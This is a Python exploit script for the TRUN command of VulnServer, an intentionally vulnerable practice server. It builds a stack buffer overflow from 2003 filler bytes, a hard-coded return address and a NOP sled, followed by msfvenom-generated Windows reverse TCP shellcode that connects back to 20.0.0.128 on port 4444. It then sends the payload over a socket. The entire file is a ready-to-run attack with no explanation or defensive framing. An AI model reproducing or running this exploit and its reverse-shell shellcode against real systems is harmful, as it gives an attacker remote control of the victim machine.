#!/usr/bin/python3

import sys, socket
from time import sleep

# $ msfvenom -p windows/shell_reverse_tcp LHOST=20.0.0.128 LPORT=4444 EXITFUNC=thread -f python -a x86 --platform windows -b "\x00"
buf =  b""
buf += b"\xdb\xd6\xbd\x2f\xef\x90\xee\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x52\x31\x6a\x17\x03\x6a\x17\x83\xc5\x13\x72"
buf += b"\x1b\xe5\x04\xf1\xe4\x15\xd5\x96\x6d\xf0\xe4\x96\x0a"
buf += b"\x71\x56\x27\x58\xd7\x5b\xcc\x0c\xc3\xe8\xa0\x98\xe4"
buf += b"\x59\x0e\xff\xcb\x5a\x23\xc3\x4a\xd9\x3e\x10\xac\xe0"
buf += b"\xf0\x65\xad\x25\xec\x84\xff\xfe\x7a\x3a\xef\x8b\x37"
buf += b"\x87\x84\xc0\xd6\x8f\x79\x90\xd9\xbe\x2c\xaa\x83\x60"
buf += b"\xcf\x7f\xb8\x28\xd7\x9c\x85\xe3\x6c\x56\x71\xf2\xa4"
buf += b"\xa6\x7a\x59\x89\x06\x89\xa3\xce\xa1\x72\xd6\x26\xd2"
buf += b"\x0f\xe1\xfd\xa8\xcb\x64\xe5\x0b\x9f\xdf\xc1\xaa\x4c"
buf += b"\xb9\x82\xa1\x39\xcd\xcc\xa5\xbc\x02\x67\xd1\x35\xa5"
buf += b"\xa7\x53\x0d\x82\x63\x3f\xd5\xab\x32\xe5\xb8\xd4\x24"
buf += b"\x46\x64\x71\x2f\x6b\x71\x08\x72\xe4\xb6\x21\x8c\xf4"
buf += b"\xd0\x32\xff\xc6\x7f\xe9\x97\x6a\xf7\x37\x60\x8c\x22"
buf += b"\x8f\xfe\x73\xcd\xf0\xd7\xb7\x99\xa0\x4f\x11\xa2\x2a"
buf += b"\x8f\x9e\x77\xfc\xdf\x30\x28\xbd\x8f\xf0\x98\x55\xc5"
buf += b"\xfe\xc7\x46\xe6\xd4\x6f\xec\x1d\xbf\x9b\xf1\x1d\xbf"
buf += b"\xcc\xf3\x1d\xae\x50\x7d\xfb\xba\x78\x2b\x54\x53\xe0"
buf += b"\x76\x2e\xc2\xed\xac\x4b\xc4\x66\x43\xac\x8b\x8e\x2e"
buf += b"\xbe\x7c\x7f\x65\x9c\x2b\x80\x53\x88\xb0\x13\x38\x48"
buf += b"\xbe\x0f\x97\x1f\x97\xfe\xee\xf5\x05\x58\x59\xeb\xd7"
buf += b"\x3c\xa2\xaf\x03\xfd\x2d\x2e\xc1\xb9\x09\x20\x1f\x41"
buf += b"\x16\x14\xcf\x14\xc0\xc2\xa9\xce\xa2\xbc\x63\xbc\x6c"
buf += b"\x28\xf5\x8e\xae\x2e\xfa\xda\x58\xce\x4b\xb3\x1c\xf1"
buf += b"\x64\x53\xa9\x8a\x98\xc3\x56\x41\x19\xe3\xb4\x43\x54"
buf += b"\x8c\x60\x06\xd5\xd1\x92\xfd\x1a\xec\x10\xf7\xe2\x0b"
buf += b"\x08\x72\xe6\x50\x8e\x6f\x9a\xc9\x7b\x8f\x09\xe9\xa9"

#Return address used: 0 x 62 50 11 AF --> \xaf\x11\x50\x62
shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + buf
ip = sys.argv[1]
port = int(sys.argv[2])

try:
	print("PYTHON VulnServer TRUN EXPLOIT\n")
	print("Sending shellcode...")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	payload = b"TRUN /.:/" + shellcode
	s.send((payload))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
